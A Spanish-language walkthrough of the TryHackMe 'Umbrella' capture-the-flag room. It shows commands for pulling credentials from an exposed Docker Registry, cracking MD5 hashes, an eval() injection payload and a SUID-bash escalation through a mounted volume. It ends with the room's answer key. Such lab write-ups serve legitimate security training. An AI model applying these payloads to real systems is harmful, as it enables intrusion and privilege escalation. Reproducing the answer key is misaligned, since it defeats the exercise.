# Umbrella

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF / Contenedores + Web | umbrella | https://tryhackme.com/room/umbrella | 02 Level Medium | TryHackMe | Docker Registry, MySQL, MD5 cracking, Node.js eval(), volúmenes Docker | Compromiso total del host (user + root) |

---

**Contexto:** La sala **Umbrella** plantea "Breach Umbrella Corp's time-tracking server by exploiting misconfigurations around containerisation". Un **Docker Registry** expuesto en el puerto 5000 permite descargar la imagen `umbrella/timetracking` y extraer las credenciales de la base de datos MySQL (cuya contraseña es una secuencia de movimientos de ajedrez: `Ng1-f3!Pe7-e5?Nf3xe5`). Con ellas se vuelcan los hashes MD5 de la tabla `users`, se rompen, y se accede por SSH como `claire-r`. El código fuente de la aplicación revela un **RCE** por `eval()` en el endpoint `/time`, con el que se consigue root en el contenedor; abusando del volúmen Docker montado (`./logs:/logs`) se crea un binario SUID que proporciona root en el host y la flag final.

## Solucionario

### Task 1: Umbrella / Flags
**Explicación:**

Se enumera la máquina (SSH 22, MySQL 3306, Docker Registry 5000, HTTP 8080) y se explota el Docker Registry abierto:

```bash
nmap -sC -sV <IP>

# Docker Registry expuesto:
curl http://<IP>:5000/v2/_catalog
# {"repositories":["umbrella/timetracking"]}
curl http://<IP>:5000/v2/umbrella/timetracking/tags/list

# Pull de la imagen y extracción:
docker pull <IP>:5000/umbrella/timetracking
docker save umbrella/timetracking -o timetracking.tar
tar -xvf timetracking.tar
# En el layer de la app se leen app.js y docker-compose.yml con las credenciales DB
```

Del `docker-compose.yml` / la configuración de la imagen se obtienen las credenciales de MySQL. La contraseña de la base de datos es una secuencia de ajedrez: `Ng1-f3!Pe7-e5?Nf3xe5`. Con ellas se conecta al MySQL y se vuelcan los hashes de la tabla `users`:

```bash
mysql -h <IP> -u root -p timetracking
# password: Ng1-f3!Pe7-e5?Nf3xe5
SELECT user, password FROM users;

# Cracking de MD5:
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Con la contraseña de `claire-r` se accede por SSH y se lee la flag de usuario. Analizando el código `app.js` montado en `/home/claire-r/timeTracker-src/`, se ve que el endpoint `POST /time` pasa la entrada del usuario a `eval()` sin saneamiento (RCE). Se inyecta un reverse shell o se crea un binario SUID en el volumen montado `/logs`:

```bash
ssh claire-r@<IP>
cat /home/claire-r/user.txt

# Payload eval(): require('child_process').exec('chown root:root /logs/bash && chmod +s /logs/bash')
# Copiado previo: cp /bin/bash /home/claire-r/timeTracker-src/logs/bash
# Desde el host:
/home/claire-r/timeTracker-src/logs/bash -p
bash-5.0# whoami
root
cat /root/root.txt
```

| Pregunta | Respuesta |
|----------|-----------|
| What is the DB password? | `Ng1-f3!Pe7-e5?Nf3xe5` |
| What is the user flag? | `THM{d832c0e4cf71312708686124f7a6b25e}` |
| What is the root flag? | `THM{1e15fbe7978061c6bb1924124fd9eab2}` |

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the DB password? | `Ng1-f3!Pe7-e5?Nf3xe5` |
| 1 | What is the user flag? | `THM{d832c0e4cf71312708686124f7a6b25e}` |
| 1 | What is the root flag? | `THM{1e15fbe7978061c6bb1924124fd9eab2}` |

---

**Metodología:** Reconocimiento de servicios, enumeración del Docker Registry expuesto, extracción de las credenciales de la imagen, volcado y cracking de hashes MD5, acceso SSH, análisis del código fuente y explotación de `eval()` para RCE en el contenedor, y abuso del volúmen montado `/logs` con un binario SUID para escalar a root en el host.

### Cadena de ataque / Attack Chain

```
nmap → Docker Registry 5000 (v2/_catalog) → pull umbrella/timetracking → credenciales DB en imagen → MySQL dump users → hashcat MD5 → SSH claire-r → user flag → app.js eval() RCE → root en contenedor → SUID bash en /logs (volumen montado) → root en host → root flag
```

**Learning chain:** Enumeración → explotación de configuración de contenedores → extracción de credenciales → cracking de hashes → acceso remoto → análisis de código → RCE dinámico → escalada mediante volúmenes Docker/Suid.

**Lección:** *Un registry de contenedores sin autenticar filtra credenciales embebidas, y una función `eval()` sobre entrada de usuario convierte una app de control de tiempo en RCE; los volúmenes compartidos entre contenedor y host son la puerta a root del S.O. anfitrión.*

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application · T1552 Unsecured Credentials · T1110.002 Password Cracking · T1059.007 JavaScript · T1068 Exploitation for Privilege Escalation · T1548.001 Setuid and Setgid.

**Fuente:** [TryHackMe - Umbrella](https://tryhackme.com/room/umbrella)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.